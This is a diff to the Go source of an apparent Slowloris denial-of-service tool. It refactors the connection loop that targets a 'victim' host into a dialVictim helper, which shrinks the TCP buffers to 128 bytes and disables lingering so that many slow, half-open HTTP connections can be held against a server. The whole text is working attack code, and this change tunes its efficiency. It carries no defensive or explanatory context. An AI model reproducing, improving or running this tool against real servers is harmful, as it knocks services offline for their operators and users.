@@ -85,9 +85,8 @@ func main() {
 	go activeConnectionsCounter(activeConnectionsCh)
 	for {
 		time.Sleep(*rampUpInterval)
-		conn, err := net.Dial("tcp", victimHostPort)
-		if err != nil {
-			log.Printf("Couldn't esablish connection to [%s]: [%s]\n", victimHostPort, err)
+		conn := dialVictim(victimHostPort)
+		if conn == nil {
 			continue
 		}
 		if _, err = conn.Write(requestHeader); err != nil {
@@ -107,7 +106,26 @@ func activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func doLoris(conn net.Conn, victimUri *url.URL, activeConnectionsCh chan<- int) {
+func dialVictim(hostPort string) io.ReadWriteCloser {
+	conn, err := net.Dial("tcp", hostPort)
+	if err != nil {
+		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+	tcpConn := conn.(*net.TCPConn)
+	if err = tcpConn.SetReadBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetWriteBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetLinger(0); err != nil {
+		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
+	}
+	return tcpConn
+}
+
+func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int) {
 	defer func() { activeConnectionsCh <- -1 }()
 	defer conn.Close()
 	readerStopCh := make(chan int, 1)
@@ -119,16 +137,15 @@ func doLoris(conn net.Conn, victimUri *url.URL, activeConnectionsCh chan<- int) 
 		}
 		select {
 		case <-readerStopCh:
-			log.Printf("The connection has been terminated by server\n")
 			return
 		case <-time.After(*sleepInterval):
 		}
 	}
 }
 
-func nullReader(r io.Reader, ch chan<- int) {
+func nullReader(conn io.Reader, ch chan<- int) {
 	defer func() { ch <- 1 }()
-	n, err := r.Read(sharedReadBuf)
+	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
 		log.Printf("Error when reading HTTP response: [%s]\n", err)
 	} else {
